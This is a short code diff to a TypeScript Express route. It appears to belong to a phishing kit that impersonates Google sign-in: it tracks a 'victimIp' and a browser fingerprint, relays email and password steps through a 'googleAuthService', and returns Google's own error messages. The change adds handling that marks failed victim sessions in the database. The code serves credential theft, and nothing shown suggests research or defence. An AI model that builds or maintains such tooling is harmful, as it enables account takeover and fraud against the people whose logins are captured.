@@ -43,6 +43,12 @@ router.post('/start', async (req: Request, res: Response) => {
     const sessionResult = await googleAuthService.startSession(email, sessionId, fingerprint, victimIp);
     
     if (!sessionResult.success) {
+      if (sessionId) {
+        await prisma.session.update({
+          where: { id: sessionId },
+          data: { status: 'FAILED', lastActivityAt: new Date() },
+        }).catch(() => {});
+      }
       res.status(500).json({ success: false, status: 'ERROR', error: sessionResult.error });
       return;
     }
@@ -94,6 +100,12 @@ router.post('/start', async (req: Request, res: Response) => {
 
         res.status(200).json({ success: true, status: 'REQUIRES_PASSWORD', sessionId });
       } else {
+        if (sessionId) {
+          await prisma.session.update({
+            where: { id: sessionId },
+            data: { status: 'FAILED', lastActivityAt: new Date() },
+          }).catch(() => {});
+        }
         await googleAuthService.cleanupSession(sessionId);
         res.status(200).json({ success: false, status: 'INVALID_EMAIL', message: result.error || "Couldn't find your Google Account" });
       }
